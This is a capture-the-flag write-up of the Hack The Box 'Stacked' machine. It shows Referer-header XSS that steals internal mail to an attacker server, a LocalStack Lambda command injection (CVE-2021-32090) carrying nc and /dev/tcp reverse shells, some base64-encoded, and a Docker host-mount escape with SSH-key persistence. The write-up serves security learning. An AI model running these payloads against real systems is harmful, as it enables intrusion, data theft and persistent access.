# Stacked Machine(10.10.11.112)

# Info:
This machine was quite special to me for few reasons. For starting my first insane machine solve. As i started this machine one day after retiring I tried not to look into solution and give it my raw try first but time to time i looked into 0xdf blog's whenever stuck, beacuse whynot *[It-is-Okay-to-Use-Writeups](https://www.hackthebox.com/blog/It-is-Okay-to-Use-Writeups)*, but main reason i think is mindset seeing insane machine it's like i am not ready for it yet so it must be something very next level thing so i have to take help but that was not the case & i will work on it in future. HTB's rating could be deceptive as there was nothing that i didn't knew already.

Now this machine was quite realistic as XSS is most common bug you will find on real targets and a CVE to exploit. All it needed was good enumeration skills and little patience to solve this. 

As Sonar's blog never handover complete exploit because what's the point in being script-kiddie we will try to understand CVE-2021-32090 by proxying AWS traffic to burp and find vulnerable parameter.  We will see docker privesc and command injection in this box. Sorry for rambling a little let's start!

![Screenshot from 2022-03-21 21-50-37](https://user-images.githubusercontent.com/79413473/159305148-5749cf05-5ee6-4c89-b8ea-7c1c7774cf5a.png)

## Recon
Starting with port scan using rustscan, as it's superfast. `rustscan -a 10.10.11.112 -u 5000 -- -A`. It will find ports then we specify to run nmap scan on found ports with **-A** option. 
```
PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: STACKED.HTB
2376/tcp open  ssl/docker? syn-ack
| ssl-cert: Subject: commonName=0.0.0.0
| Subject Alternative Name: DNS:localhost, DNS:stacked, IP Address:0.0.0.0, IP Address:127.0.0.1, IP Address:172.17.0.1
| Issuer: commonName=stacked/organizationName=Stacked/stateOrProvinceName=Some State/countryName=UK/emailAddress=support@stacked.htb/organizationalUnitName=Some Section/localityName=Some City
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-07-17T15:37:02
| Not valid after:  2022-07-17T15:37:02
| MD5:   c103 22e2 b1e1 b970 0cef 4e64 285a 6fcb
| SHA-1: f0c8 1145 c124 3226 3033 1fb2 9449 b4c3 cae7 2e0f
| -----BEGIN CERTIFICATE-----
| MIIFfjCCA2agAwIBAgIUZ/FIky8ZSWKuuFwl3TIYJHmTIlIwDQYJKoZIhvcNAQEL
| BQAwgZUxCzAJBgNVBAYTAlVLMRMwEQYDVQQIDApTb21lIFN0YXRlMRIwEAYDVQQH
| DAlTb21lIENpdHkxEDAOBgNVBAoMB1N0YWNrZWQxFTATBgNVBAsMDFNvbWUgU2Vj
| dGlvbjEQMA4GA1UEAwwHc3RhY2tlZDEiMCAGCSqGSIb3DQEJARYTc3VwcG9ydEBz
| dGFja2VkLmh0YjAeFw0yMTA3MTcxNTM3MDJaFw0yMjA3MTcxNTM3MDJaMBIxEDAO
| BgNVBAMMBzAuMC4wLjAwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQDH
| xLhNDaM9vqmNiafy3K41AIDFjIAjK0pl5tGHVdgejNIp1F2tUD+anBZRQIpAkOW6
| 9fJyWnlHsBC1XBkiUcT4vWXObfkY343OAbHbfL6R6p2f8vj3uQbQkjtz9ajqQ6TL
| lH+MQqgpH+gbWIQFOZJsvEkQRnCwZ673C3FibzhwrWbUH+SyOcJi2Yammqw90y4b
| dclaLIuc5dsxmIMgqnjTz3THozQ/Hmd1vvTmZlUxwP7IJm+rMe84Qz5SNtlBLphG
| KPi1aIlpKBqfq02FyV7QoybtmQeV3euSsD8+e3pfGQ/6xmicuoaes3RHb9k5Fyva
| +wxrR6wbuElVLraKiqbgDnErgnbNJYYrcjoFqWJNNcAgDJ/F4b0PtnIpOdCdxIu2
| rIlIWvXsAHMJBaV4su+YCWg0pehoM+o0CDmnsQ7Rs06M57edjhs3+g2AlBDgsEAh
| 8pK8VPlmU8iXePElRnErv0r8r2yNQCsmNftO0RLHdgl4DusIxyBpLimpQhVO4gh8
| SIKMIanAo85G10fbElbCI6sFT4rPmsj+a2BX/l4EJl06ue1lehDSkAxBQV2e3Bw8
| 2gb4OI22gw8O5bdwjiUORVsKivDsCZ14nkDbx1I48pKFVa6VDCou4JeeoiUcKEmR
| 3mkh3q5NRbGkpDigpqJbjlsfBL6aNh7xGptmsYj/XwIDAQABo0gwRjAvBgNVHREE
| KDAmgglsb2NhbGhvc3SCB3N0YWNrZWSHBAAAAACHBH8AAAGHBKwRAAEwEwYDVR0l
| BAwwCgYIKwYBBQUHAwEwDQYJKoZIhvcNAQELBQADggIBALTP1kELPcs4M7YIXUsU
| NfqThT5T2soFsXzz6aDP4sLakcoQX6mgZcD0K0pNUqzGHYCS5qOZT5lydq3dF9zw
| BdUTXG23dYUC43mGt2CPJ3obCvVFRbSuHCf53rc5i/V9QfamVR+zjTgp2YsGA5Tt
| Yk1uenqnz+SZ8zs9VmkdV4v9eUfPfxv5jogFjn1E8MOgyr7wGqQWl/Rf8l4VqvxC
| NM3yBq9YfSgPz9I9pgd8ragEAO4Y8To2OlBRVBNUmaY+LVvgS4+nnjD8j8zxWLQc
| mnrzmsetkilA4czni+RzZnPi6koavYOvyb1nNw5UnWw0GslJ5gXvTrWV9qQfoBrj
| rHBB8aJgEczUCOGcjwnwLMAWhtOxaEJkSkm29O/EO4OSv0aR42/EjYcZmW011J07
| 7aWNGdT2OWEiYDIO5P14XMK2YehE0MYiVE6fzo/HL7UXknvcc2cNQ0TYRGf+opE1
| S02Nhv6JKoBdAapua1JkbfAjtf/AXs9rBradZbqd9v8CJi9p69k+vd6mG7Dc/A0p
| oHB3cv4piLy9OmNj7Em+7GSWeRXxebJNYDxwwLqt1tv/5jvE+or69dpOCTtunFEn
| 5pPJnTRUy+Rc8A3cwhqtPDAt2kD4F33RGxtes9nYlUCnHd6+ES3trE+UEeG/5YAN
| OuUflHphXpQ7WAV+RCufbEnX
|_-----END CERTIFICATE-----
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

It reveals hostname **stacked.htb** and it's running Apache server and docker on port 2376. But we can't connect to that docker as it's protected with CA certificate so only people with right set of keys can connect to it. As stated [here](https://docs.docker.com/engine/security/protect-access/):
```
In the daemon mode, it only allows connections from clients authenticated by a certificate signed by that CA. In the client mode, it only connects to servers with a certificate signed by that CA.
```
**stacked.htb** is static website let's run vhost fuzzing on it in background.
```
ffuf -u http://stacked.htb/ -w ~/wordlist/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.stacked.htb" -fw 18
```
![Screenshot from 2022-03-21 22-09-35](https://user-images.githubusercontent.com/79413473/159311329-cbea298d-7ef7-4408-839b-9bcfb3fc916d.png)

![Screenshot from 2022-03-21 22-07-35](https://user-images.githubusercontent.com/79413473/159311224-69d89fbb-1dbc-4bf0-b4fe-5f7be18acc9b.png)

Let's add portfolio vhost to our */etc/hosts* file **10.10.11.112   stacked.htb portfolio.stacked.htb** and check it.

![Screenshot from 2022-03-21 22-13-20](https://user-images.githubusercontent.com/79413473/159311923-b67db97c-1eda-4876-bbf9-77ab86d082a1.png)

Now at this page localstack logo was interesting due to machine name and i quickly googled what it is and any exploit for it. Localstack is opensource tool which emaulte cloud service in local environment without needing to connect to actual services like AWS, more on it [here](https://github.com/localstack/localstack). 

Also I found [this](https://blog.sonarsource.com/hack-the-stack-with-localstack) blog on localstack recent vulnerabilities by sonarsource. And sure **Command Injection Vulnerability (CVE-2021-32090)** was interesting and ofcourse while i was doing all this directory and file fuzzing was running in background as iipsec says it good to have it running. But it doesn't reveal much other than js and images etc. 

On page there is an option to download the  **docker-compose.yml** file to be able to spin it locally on your machine with *docker-compose up*.

![Screenshot from 2022-03-21 22-20-53](https://user-images.githubusercontent.com/79413473/159316503-3c306eb2-3443-4909-9fea-fdb25c103f68.png)

```
version: "3.3"

services:
  localstack:
    container_name: "${LOCALSTACK_DOCKER_NAME-localstack_main}"
    image: localstack/localstack-full:0.12.6
    network_mode: bridge
    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
    environment:
      - SERVICES=serverless
      - DEBUG=1
      - DATA_DIR=/var/localstack/data
      - PORT_WEB_UI=${PORT_WEB_UI- }
      - LAMBDA_EXECUTOR=${LAMBDA_EXECUTOR- }
      - LOCALSTACK_API_KEY=${LOCALSTACK_API_KEY- }
      - KINESIS_ERROR_PROBABILITY=${KINESIS_ERROR_PROBABILITY- }
      - DOCKER_HOST=unix:///var/run/docker.sock
      - HOST_TMP_FOLDER="/tmp/localstack"
    volumes:
      - "/tmp/localstack:/tmp/localstack"
      - "/var/run/docker.sock:/var/run/docker.sock"
``` 
Here localstack version 0.12.6 confirms that it is vulnerable to command injection CVE.

## Foothold: Exploiting XSS & Localstack command injection

As we know the path we have to follow but we have no way to interact with localstack instance yet let's dig around. There is an contact form on page which actually works this time unlike other HTB machines. 

![Screenshot from 2022-03-21 22-28-00](https://user-images.githubusercontent.com/79413473/159321598-6781fbc3-4294-43ae-9cfc-d215a2abb6fd.png)

While injecting xss payloads in input fields it trigger some WAF and says XSS detected. Hmm as [zseano](https://twitter.com/zseano) says when there is waf there is a bypass and a vulerability. Also i knew if i can get xss i can force user on other end to visit localstack instance and send back response. I have done this previously due to bug-bounty that's why super cool & realistic machine.

![Screenshot from 2022-03-21 22-32-54](https://user-images.githubusercontent.com/79413473/159325673-3a4e9f3a-3da7-4fde-b1bf-c7e9faff5d49.png)

I tried poking around and trying different encoding, paramters in order to find what actually is getting filtered or triggering the WAF. Turns out combination of word **script** & **<** is triggering it. Can't bypass with something like **ScrIPt** it's good. Double URL encoding bypassed it but it never came back to me in request to confirm. Now this reminds me of looking at what parametrs actually get stored on other side after rooting. 0xdf did a fanstastic job already on that already, [here](https://0xdf.gitlab.io/2022/03/19/htb-stacked.html) but i want to try it out too & check parameters which are reflected.

At this point i ran out of ideas, i also i tested XSS in user-agent but i never thought **Referer Header** is way in. As most of the time XSS by referer is self xss, because you can't control other people's request's Referer header unless you control their browser or any other vulnerability chian. But What if backend is storing **Headers** for some analytics purpose. So that's why it can be a good thing to test xss over referer header. As there is no response coming back we have to force victim to connect to our server to confirm xss as PoC.

![xss](https://user-images.githubusercontent.com/79413473/159328848-3b9d41e9-493c-4c5f-9c71-b16707e13285.png)

![Screenshot from 2022-03-21 22-50-56](https://user-images.githubusercontent.com/79413473/159328941-873fd32c-9d28-4bd8-9ec6-f9139b503ab1.png)

It connects to our server with little bit of waiting.

Which means we can execute arbitray javascript on victim user's behalf. Well Another thing that came handly was knowing XMLHttpRequest. Using it we can make request to localstack instance and send it's response back to our server.

Also in request header **Referer: http://mail.stacked.htb/read-mail.php?id=2** was interesting. Let's add that vhost our hosts file but it redirects to **stacked.htb** always. Also no matter how many request you sent **id=** parameter is always **>=2**. It can be vulnerable to IDOR vulnerability and we can see other poeple email for instance id=1. 

I also spwaned my local instance of localstack using docker-cpompose file by **docker-compose up** to follow sonarsource's blog. 

![Screenshot from 2022-03-21 23-10-49](https://user-images.githubusercontent.com/79413473/159332299-793d571a-bf84-4edf-a886-ef8c2535a4c0.png)

As it kept talking about **fucntionName** parameter being vulnerable but i don't know where is this paramter and how it's invoked. 
```
    ports:
      - "127.0.0.1:443:443"
      - "127.0.0.1:4566:4566"
      - "127.0.0.1:4571:4571"
      - "127.0.0.1:${PORT_WEB_UI-8080}:${PORT_WEB_UI-8080}"
```
As it needs few ports including 8080 which is burp by default i thought i will change it in docker file to 8082 and fortunately it didn't give any error and docker instance  spawned but whenever i tried accessing it said **Request reset error** i guess it didn't like port change. Let's not go that rabbit hole and change our burp listener and spawn docker agian with default port.

![Screenshot from 2022-03-21 23-08-54](https://user-images.githubusercontent.com/79413473/159331938-be95458c-ab06-4007-bfd3-02888a518c68.png)

Now i can access AWS console on port 4566 and localstack dashboard at 8080.

![Screenshot from 2022-03-21 23-13-21](https://user-images.githubusercontent.com/79413473/159332662-d086063d-f133-4a3d-adfe-d71f84c86d8c.png)

![Screenshot from 2022-03-21 23-13-01](https://user-images.githubusercontent.com/79413473/159332679-43d3163e-18fd-4947-897b-9be9cbf2dbf1.png)

I played with both these to find functionName parameter. But i stupidly missed that the lambda in blog is referring to AWS lambda feature. That's what happen when you are not familiar with technology. But after 0xdf's blog help i knew it and it all made sense that when we create lambda fucntion on AWS functionName paramter is sent and the which handles this name is vulnerable to code execution. To check this ofcourse i had to proxy my aws requests to burp from terminal. Because aws-cli communicate through nothing but HTTP request. So i quickly google this and [found](https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-proxy.html) that we can set proxy environment variables in terminal. 

![Screenshot from 2022-03-21 23-21-51](https://user-images.githubusercontent.com/79413473/159334051-189c917c-f367-4a20-8291-4d20dc7f6fb7.png)

Also df suggested a great tool [awscli-local](https://github.com/localstack/awscli-local) in order to avoid typing -**-endpoint-url localhost:4566** repeatedly in local environment.

So after setting **HTTP_PROXY** & **HTTPS_PROXY** to my burp i can monitor aws requests

![Screenshot from 2022-03-21 23-25-45](https://user-images.githubusercontent.com/79413473/159334898-ab1fae8e-3956-43e6-878c-00cb28afd8d5.png)

in burp 

![Screenshot from 2022-03-21 23-27-04](https://user-images.githubusercontent.com/79413473/159334973-8842d334-1d60-4c52-82da-5cf1726e876d.png)

Let's create a lambda function for our instance, again aws docs were to help i created a python script to upload which i though i can get shell after invoking it. Unfortunately that didn't work out as i did something wrong in creating it and it always errored out but id did the intended work so i left it. In ippsec's [video](https://www.youtube.com/watch?v=aWXfEDIYZu8) he did that with perfection you can take a look there. Let's create function and monitor the request with python runtime and script being function.py which i zipped to function.zip

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("My-IP",8088));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
### Creating lambda function:

```
awslocal lambda create-function --function-name "test-function" --zip-file fileb://function.zip --runtime python3.9 --role arn:aws:iam::123456789012:role/lambda-ex
``` 

Response:
```
{
    "FunctionName": "test-function",
    "FunctionArn": "arn:aws:lambda:us-east-1:000000000000:function:test-function",
    "Runtime": "python3.9",
    "Role": "arn:aws:iam::123456789012:role/lambda-ex",
    "Handler": "handler.handler",
    "CodeSize": 324,
    "Description": "",
    "Timeout": 3,
    "LastModified": "2022-03-21T18:06:52.203+0000",
    "CodeSha256": "iBPuas5OAWqBV+RPLfbScTWPlzIKGqW4XFmnTwSLO7o=",
    "Version": "$LATEST",
    "VpcConfig": {},
    "TracingConfig": {
        "Mode": "PassThrough"
    },
    "RevisionId": "fff3a263-b409-41e1-938d-97b7a80af9fd",
    "State": "Active",
    "LastUpdateStatus": "Successful",
    "PackageType": "Zip"
}
```

Request made in burp:

![Screenshot from 2022-03-21 23-38-58](https://user-images.githubusercontent.com/79413473/159336917-ae756cf2-6889-4e6e-a4a7-9a9aba6bf31e.png)

Also you must have spotted what functionName was it is name we provide **--function-name** flag. That means we can inject commands now. But let's first invoke our function

```
awslocal lambda invoke --function-name test-function response.json
```

![Screenshot from 2022-03-21 23-43-03](https://user-images.githubusercontent.com/79413473/159337551-8da93ab0-79fa-47be-840b-c085766e5b4e.png)

I got some handler error obviosly my script didn't execute. Let's test command injection now

```
awslocal lambda create-function --function-name "test;id|nc 10.10.16.13 8088" --zip-file fileb://function.zip --runtime python3.9 --role arn:aws:iam::123456789012:role/lambda-ex
```
![Screenshot from 2022-03-21 23-44-57](https://user-images.githubusercontent.com/79413473/159337857-d53a0338-ad01-416b-ad5f-f2906e3c71e9.png)

But i got no connection back. Let's invoke this maybe then
```
awslocal lambda invoke --function-name "test;id|nc 10.10.16.13 8088" response.json
```
Nope, let check dashboard here we can see all our function created

![Screenshot from 2022-03-21 23-47-52](https://user-images.githubusercontent.com/79413473/159338332-f4ac3780-3309-447e-9d34-288350e2cfd1.png)

and as soon as dashboard loads completely we get a hit.

![Screenshot from 2022-03-21 23-48-33](https://user-images.githubusercontent.com/79413473/159338411-bf6e6879-479c-4668-854b-f982498b613f.png)

Which means if we can create a lambda function on stacked machine and load that dasboard we can get a shell back as localstack user, which will be inside a container as localstack itself is running inside container.

### Little Edit:
I figured out what was causing my python script to not run inside container by looking at this error in container log
 
![Screenshot from 2022-03-21 23-58-38](https://user-images.githubusercontent.com/79413473/159342097-93640802-8fb9-46ae-86ab-0d6cf3068402.png)

container didn't have python3.9 so i redeployed with python3.8 runtime. And it resolved but only to get a new error which is something related to i guess correct format to write python script in Lambda.
```
{"errorType":"Runtime.ImportModuleError","errorMessage":"Unable to import module 'handler': No module named 'handler'"}.:
```
Anyway move on. Now we have to get back to XSS 

### Finding another vhost

Let's read that first email now on **mail.stacked.htb** using xss.

Injecting xss in referer header to fetch **mail.js** which will be executed

![Screenshot from 2022-03-22 12-53-48](https://user-images.githubusercontent.com/79413473/159428698-88f12b6d-fdd2-43f2-b652-cccad6a431b3.png)

mail.js hosted on my server, it will make a GET request to read mail then save the response and send back to me using another GET request to my server.
```
let xhr= new XMLHttpRequest();
xhr.open('GET','http://mail.stacked.htb/read-mail.php?id=1', false);  //Making a synchronous request to read email
xhr.onload = function() {
   var responseb = xhr.response;   //saving response in a varible
   
    let yhr = new XMLHttpRequest();
    url='http://MY-IP:8088/?c='+responseb
    yhr.open('GET',url, true)   // Sending response back to my server.
    yhr.send()
}


xhr.send();
```
but using GET request has a drawback it has a limit on how much data we can send in a paramter.

![Screenshot from 2022-03-22 12-57-07](https://user-images.githubusercontent.com/79413473/159429207-93ba8a59-5b1c-41ca-a36e-637e3c9952ad.png)

```
<!DOCTYPE html><html lang="en"><head>  <meta charset="utf-8">  <meta name="viewport" content="width=device-width, initial-scale=1">  <title>AdminLTE 3 | Read Mail</title>  <!-- Google Font: Source Sans Pro -->  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source Sans Pro:300,400,400i,700&display=fallback">  <!-- Font Awesome -->  <link rel="stylesheet" href="plugins/fontawesome-free/css/all.min.css">  <!-- Theme style -->  <link rel="stylesheet" href="dist/css/adminlte.min.css"></head><body class="hold-transition sidebar-mini"><div class="wrapper">  <!-- Navbar -->  <nav class="main-header navbar navbar-expand navbar-white navbar-light">    <!-- Left navbar links -->    <ul class="navbar-nav">      <li class="nav-item">        <a class="nav-link" data-widget="pushmenu" href="
```
 this is clearly not complete response that's why we have to switch to POST request.
 
 New mail.js 
 
 ```
 let xhr= new XMLHttpRequest();
xhr.open('GET','http://mail.stacked.htb/read-mail.php?id=1', false);  //Making a request to read email
xhr.onload = function() {
   var responseb = xhr.response;   //saving response in a varible
   
    let yhr = new XMLHttpRequest();
    url='http://10.10.16.13:8088'
    yhr.open('POST',url, true)   
    yhr.send(responseb);    // sending data in body
}


xhr.send();
```

![Screenshot from 2022-03-22 13-05-35](https://user-images.githubusercontent.com/79413473/159430515-283f7580-687f-4f15-b1d4-a87f530e4c09.png)

Let's render received HTML in body

![Screenshot from 2022-03-22 13-07-10](https://user-images.githubusercontent.com/79413473/159430764-c68184b6-d665-490a-b250-2c0004921ad0.png)

In mail it listed to AWS instance at **s3-testing.stacked.htb** , we will add that to our hosts file. And it has the same response which we saw on our local instance confirming localstack is running here

![Screenshot from 2022-03-22 13-09-03](https://user-images.githubusercontent.com/79413473/159431195-8af37436-3dac-4681-b9ca-26a31e591992.png)

other way you can confirm localstack is running by using xss, making request to 127.0.0.1:4566 then saving the response and sending back it you. That will reveal same thing that localstack is running but for the sack of length of blog i am not gonna show that.

As we got a way to interact with instance we can create lambda function also it says that only node application is supported, 
*I have initialized a serverless instance for you to work from but keep in mind for the time being you can only run node instances*, but that doesn't matter as we have to just create a lambda function with command injection and redirect the user to localstack dashboard to execute that.

I will use same python script and upload same function.zip i used on local instance.

#### Creating Lambda Funciton with reverse shell
```
aws --endpoint-url http://s3-testing.stacked.htb lambda create-function --function-name "test;bash -c 'bash -i >& /dev/tcp/IP/8089 0>&1'" --zip-file fileb://function.zip --runtime python3.9 --role arn:aws:iam::123456789012:role/lambda-ex
```
![Screenshot from 2022-03-22 13-30-12](https://user-images.githubusercontent.com/79413473/159434422-73b13571-2d0e-46ee-af48-b54530d26e5b.png)


#### Redirecting user to localstack dashboard with xss.

**document.location.href='http://127.0.0.1:8080'**

![Screenshot from 2022-03-22 13-22-52](https://user-images.githubusercontent.com/79413473/159433242-7373b414-674f-4c0c-b1ba-a05d4a2f664f.png)

As soon as victim's dashboard loads, we get reverse shell after few minutes as localstack user in container

![Screenshot from 2022-03-22 13-24-08](https://user-images.githubusercontent.com/79413473/159433460-6a837441-cf9f-433f-8dcf-3e4addc051bb.png)

From **/home/localstack** we can read user flag. And also upgraded to proper shell using python pty.

## Getting root in docker : Command injection

Now enumeration was key here specially what happens in container when we create & invoke lambda fucntions. Let's upload [pspy](https://github.com/DominicBreuker/pspy) and monitor processes.

Execute pspy and in other pane create a lambda function and invoke it. 

```
aws --endpoint-url http://s3-testing.stacked.htb lambda create-function --function-name "testx" --zip-file fileb://function.zip --runtime python3.9 --role arn:aws:iam::123456789012:role/lambda-ex --handler "test"
```
this unzip the archive 
![Screenshot from 2022-03-22 15-17-27](https://user-images.githubusercontent.com/79413473/159452984-d629276c-aa84-4742-ba92-0f575a759405.png)

then after invoking it 
```
aws --endpoint-url http://s3-testing.stacked.htb lambda invoke --function-name "testx" response.json
```

it extracts all the flags passed for environment variables and set them

**docker create -i -e DOCKER_LAMBDA_USE_STDIN=1 -e LOCALSTACK_HOSTNAME=172.17.0.2 -e EDGE_PORT=4566 -e _HANDLER=test -e AWS_LAMBDA_FUNCTION_TIMEOUT=3 -e AWS_LAMBDA_FUNCTION_NAME=testx -e AWS_LAMBDA_FUNCTION_VERSION=$LATEST -e AWS_LAMBDA_FUNCTION_INVOKED_ARN=arn:aws:lambda:us-east-1:000000000000:function:testx -e AWS_LAMBDA_COGNITO_IDENTITY={} --rm lambci/lambda:python3.9 test **

then it passes to /bin/sh 

![Screenshot from 2022-03-22 15-21-42](https://user-images.githubusercontent.com/79413473/159453751-5b39b24a-c72a-41f6-a1ad-23305b8c89aa.png)

```
/bin/sh -c CONTAINER_ID="$(docker create -i   -e DOCKER_LAMBDA_USE_STDIN="$DOCKER_LAMBDA_USE_STDIN" -e LOCALSTACK_HOSTNAME="$LOCALSTACK_HOSTNAME" -e EDGE_PORT="$EDGE_PORT" -e _HANDLER="$_HANDLER" -e AWS_LAMBDA_FUNCTION_TIMEOUT="$AWS_LAMBDA_FUNCTION_TIMEOUT" -e AWS_LAMBDA_FUNCTION_NAME="$AWS_LAMBDA_FUNCTION_NAME" -e AWS_LAMBDA_FUNCTION_VERSION="$AWS_LAMBDA_FUNCTION_VERSION" -e AWS_LAMBDA_FUNCTION_INVOKED_ARN="$AWS_LAMBDA_FUNCTION_INVOKED_ARN" -e AWS_LAMBDA_COGNITO_IDENTITY="$AWS_LAMBDA_COGNITO_IDENTITY"   --rm "lambci/lambda:python3.9" "test")"

docker cp "/tmp/localstack/zipfile.dba734ce/." "$CONTAINER_ID:/var/task"

docker start -ai "$CONTAINER_ID";
```
Now we can inject command in /bin/sh but injecting in variables will not work like **AWS_LAMBDA_FUNCTION_NAME**. now excluding these variables handler and runtime is left. Let's inject in handler.

Create a function

```
aws --endpoint-url http://s3-testing.stacked.htb lambda create-function --function-name "test9" --zip-file fileb://function.zip --runtime python3.9 --role arn:aws:iam::123456789012:role/lambda-ex --handler "test\$(id|nc MY-IP 8585)"
```
\$ is escaping '$' symbol otherwise it executes on my machine first then send it to localstack.

Let's invoke it.

```
aws --endpoint-url http://s3-testing.stacked.htb lambda invoke --function-name "test9" response.json
```
in docker 

![Screenshot from 2022-03-22 15-27-58](https://user-images.githubusercontent.com/79413473/159455097-2513f562-6370-458d-a21d-2cd0d68c073a.png)

on my listener i get hit as root

![Screenshot from 2022-03-22 15-28-44](https://user-images.githubusercontent.com/79413473/159455208-50a55119-078e-4766-8075-f4266a78ee49.png)

Let's get root shell from here, *Caution: generric reverse shell won't work as you are inside /bin/sh. You have to pass it to bash first.*

I base64 encoded my reverse shell and passed to bash

```
aws --endpoint-url http://s3-testing.stacked.htb lambda create-function --function-name "test6" --zip-file fileb://function.zip --runtime python3.9 --role arn:aws:iam::123456789012:role/lambda-ex --handler "test\$(echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMTMvODA4NiAwPiYxICAK | base64 -d | bash)"
```
invoke it and we get shell as root

![Screenshot from 2022-03-22 15-31-35](https://user-images.githubusercontent.com/79413473/159455708-9ebf1159-d8aa-4dc5-8b14-be4c5553f343.png)

## Privilege escaltion: docker abuse

Now as root inside we can run docker and run containers and mount host file system in it.

![Screenshot from 2022-03-22 15-49-38](https://user-images.githubusercontent.com/79413473/159459053-df0b0f44-9ec3-4d33-a2f1-6b3a4e82c6a4.png)

Let's start image 0601ea177088 by mounting it with host file system. Other one is container in which we are. CHeck with *hostname*

```
docker run -d -v /:/mnt -it 0601ea177088 bash
```
it runs container in background and mount host file system in it. if -d options is not specified then you will require other pane to get root.

![Screenshot from 2022-03-22 15-53-08](https://user-images.githubusercontent.com/79413473/159459554-d58fc0ea-c392-4509-b206-a474f3d36b96.png)

Let's do **docker exec** in this new container. exec tells docker to run this new command in running container.

```
docker exec -i 88e0e95df8b2 bash
```

now in docker host file system is mounted

![Screenshot from 2022-03-22 15-56-34](https://user-images.githubusercontent.com/79413473/159461114-9ed76384-8a0a-4aea-8435-92d61e2a468a.png)

Let's read root flag from /mnt/root & gain persistence by placing our ssh keys in .ssh.

![Screenshot from 2022-03-22 15-57-53](https://user-images.githubusercontent.com/79413473/159461742-1055470d-c68a-455a-b86b-28ef25358203.png)

and that's how we get root on machine

![Screenshot from 2022-03-22 16-01-12](https://user-images.githubusercontent.com/79413473/159462300-1b13d099-bf98-42fc-92b5-2dc2bbc8ac27.png)

## Extras: Looking at mail server for xss paramters

Looking at cong file for mail server

![Screenshot from 2022-03-22 16-03-07](https://user-images.githubusercontent.com/79413473/159462625-c29611c4-6fae-4175-b669-f363d3691197.png)

I am not gonna replace 127.0.0.1 with * as it will ruin box for someone doing it currently. Let's do port forward

```
ssh -i id_rsa -L 8084:127.0.0.1:80 root@stacked.htb
```

I thought i would have to place **mail.stacked.htb 127.0.0.1** vhost in my hosts file but to surprise it just by default gave me mail.stacked.htb. i don't know exact reason. But doing `curl 127.0.0.1` gives mail server in box. Anyway here it is mailbox

![Screenshot from 2022-03-22 16-08-50](https://user-images.githubusercontent.com/79413473/159463611-3a34e54d-fe9e-44c8-a0a0-be06416f3b7c.png)

We have seen this AdminLTE in bolt machine previously.

![Screenshot from 2022-03-22 16-10-20](https://user-images.githubusercontent.com/79413473/159463865-d680ea33-599f-4b0b-baf9-9c20dac4c80e.png)

Let's send a new email from contact form

![Screenshot from 2022-03-22 16-11-29](https://user-images.githubusercontent.com/79413473/159464253-f34c9681-2526-4293-8e0a-544b062344de.png)

Funny thing the moment i opened new mail i got redirected to 

![Screenshot from 2022-03-22 16-14-54](https://user-images.githubusercontent.com/79413473/159464572-898ea9db-9c8a-43e1-9f90-fa854b2c6ce6.png)

then i rememberthat my xss is still set. I xssed myself and got redirected to burp page. 

*<script>document.location.href='http://127.0.0.1:8080'</script>*

Let's fix that 

![Screenshot from 2022-03-22 16-17-54](https://user-images.githubusercontent.com/79413473/159465288-4287397b-29fa-4af9-b47e-27221c097db6.png)

Well few paramters are reflected but they are protected remember? but referer is not. that's why we get

![Screenshot from 2022-03-22 16-18-32](https://user-images.githubusercontent.com/79413473/159465270-a67cc98e-6d04-4fe9-a9eb-55339cc2b4cb.png)

### Let's look at how xss filtering is working.

It takes every paramter and send it to detectXSS function, which decide if input is safe.

![Screenshot from 2022-03-22 16-24-22](https://user-images.githubusercontent.com/79413473/159467387-74374dd6-92a6-4963-9f4f-92cfa0f94eff.png)

Which can befound [here](https://github.com/symphonycms/xssfilter).

It uses regex to filter out bad words. you can read more in */var/www/portfolio/functions.php* maybe someone can bypass these.

![Screenshot from 2022-03-22 16-27-39](https://user-images.githubusercontent.com/79413473/159467453-9ee0891a-7393-4e27-86b4-90f7a3225e3d.png)

That's it from my side for this machine. Thank you for reading and feedbacks are welcome.




